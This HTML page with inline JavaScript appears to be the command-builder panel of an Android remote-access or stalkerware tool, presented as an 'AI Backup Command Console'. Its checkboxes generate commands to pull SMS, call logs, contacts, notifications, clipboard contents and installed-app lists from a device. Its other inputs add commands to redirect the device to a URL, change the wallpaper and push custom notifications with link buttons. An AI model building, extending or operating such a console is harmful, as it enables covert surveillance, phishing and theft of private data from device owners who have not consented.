<html>
<head>
<meta charset="UTF-8">
<title>AI Backup Command Console</title>
<link rel="stylesheet" href="styles.css">
</head>

<body>

<div class="app">

<div class="header">
AI Backup Command Console
</div>

<div class="layout">

<!-- LEFT PANEL -->
<div class="left-panel">

<div class="panel device-panel">

<div class="panel-title">Device Control</div>

<label class="cmd">
<input type="checkbox" data-cmd="deviceinfo">
<span>deviceinfo</span>
</label>

<label class="cmd">
<input type="checkbox" data-cmd="connection">
<span>connection</span>
</label>

<div class="input-group">

<input id="redirectUrl" placeholder="Redirect URL">

<button onclick="addRedirect()">ADD</button>

</div>

<div class="input-group">

<input id="wallpaperUrl" placeholder="Wallpaper URL">

<button onclick="addWallpaper()">ADD</button>

</div>

</div>


<div class="panel apps-panel">

<div class="panel-title">Apps</div>

<label class="cmd"><input type="checkbox" data-cmd="apps full"><span>apps full</span></label>
<label class="cmd"><input type="checkbox" data-cmd="apps 1d"><span>apps 1d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="apps 7d"><span>apps 7d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="apps 30d"><span>apps 30d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="apps installed 1d"><span>apps installed 1d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="apps installed 7d"><span>apps installed 7d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="apps installed 30d"><span>apps installed 30d</span></label>

</div>

</div>


<!-- CENTER PANEL -->

<div class="center-panel">

<div class="panel">

<div class="panel-title">SMS</div>

<label class="cmd"><input type="checkbox" data-cmd="sms full"><span>sms full</span></label>
<label class="cmd"><input type="checkbox" data-cmd="sms 1d"><span>sms 1d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="sms 7d"><span>sms 7d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="sms 30d"><span>sms 30d</span></label>

</div>

<div class="panel">

<div class="panel-title">Calls</div>

<label class="cmd"><input type="checkbox" data-cmd="calls full"><span>calls full</span></label>
<label class="cmd"><input type="checkbox" data-cmd="calls 1d"><span>calls 1d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="calls 7d"><span>calls 7d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="calls 30d"><span>calls 30d</span></label>

</div>

<div class="panel">

<div class="panel-title">Contacts</div>

<label class="cmd"><input type="checkbox" data-cmd="contacts full"><span>contacts full</span></label>

</div>

</div>


<!-- RIGHT PANEL -->

<div class="right-panel">

<div class="panel">

<div class="panel-title">Notifications</div>

<label class="cmd"><input type="checkbox" data-cmd="notification full"><span>notification full</span></label>
<label class="cmd"><input type="checkbox" data-cmd="notification 1d"><span>notification 1d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="notification 7d"><span>notification 7d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="notification 30d"><span>notification 30d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="no notification"><span>no notification</span></label>

</div>


<div class="panel">

<div class="panel-title">Clipboard</div>

<label class="cmd"><input type="checkbox" data-cmd="clipboard full"><span>clipboard full</span></label>
<label class="cmd"><input type="checkbox" data-cmd="clipboard 1d"><span>clipboard 1d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="clipboard 7d"><span>clipboard 7d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="clipboard 30d"><span>clipboard 30d</span></label>
<label class="cmd"><input type="checkbox" data-cmd="no clipboard"><span>no clipboard</span></label>

</div>


<div class="panel">

<div class="panel-title">Custom Notification</div>

<div id="notifications"></div>

<button onclick="addNotificationBox()">Add Notification</button>

</div>


<div class="panel output">

<div class="panel-title">Generated Commands</div>

<textarea id="result"></textarea>

<button onclick="generate()">Generate</button>
<button onclick="copy()">Copy</button>

</div>

</div>

</div>

</div>

<script>

/* YOUR JS IS UNCHANGED */

let redirectCommands=[]
let wallpaperCommands=[]
let notificationCommands=[]

function addRedirect(){
let url=document.getElementById("redirectUrl").value
if(url) redirectCommands.push("redirect url "+url)
}

function addWallpaper(){
let url=document.getElementById("wallpaperUrl").value
if(url) wallpaperCommands.push("change wallpaper "+url)
}

function addNotificationBox(){
let box=document.createElement("div")
box.className="notification-box"
box.innerHTML=`
Title:<input class="ntitle"><br>
Message:<input class="nmessage"><br>
Repeat:<input class="nrepeat" value="1"><br>
Button:<input class="nbutton"><br>
URL:<input class="nurl"><br>
`
document.getElementById("notifications").appendChild(box)
}

function generate(){

let cmds=[]

document.querySelectorAll("input[type=checkbox]:checked")
.forEach(cb=>cmds.push(cb.dataset.cmd))

cmds=cmds.concat(redirectCommands)
cmds=cmds.concat(wallpaperCommands)

let notif=[]

document.querySelectorAll(".notification-box")
.forEach(box=>{

let title=box.querySelector(".ntitle").value
let message=box.querySelector(".nmessage").value
let repeat=box.querySelector(".nrepeat").value
let button=box.querySelector(".nbutton").value
let url=box.querySelector(".nurl").value

if(title && message){

let cmd="send notification | title="+title+" | message="+message

if(repeat) cmd+=" | repeat="+repeat
if(button) cmd+=" | button="+button
if(url) cmd+=" | url="+url

notif.push(cmd)

}

})

let notifText=notif.join(",,,,,")

let final=cmds.join(", ")

if(notifText){
if(final) final+=", "
final+=notifText
}

document.getElementById("result").value=final

}

function copy(){
let text=document.getElementById("result")
text.select()
document.execCommand("copy")
alert("Copied")
}

</script>

</body>
</html>
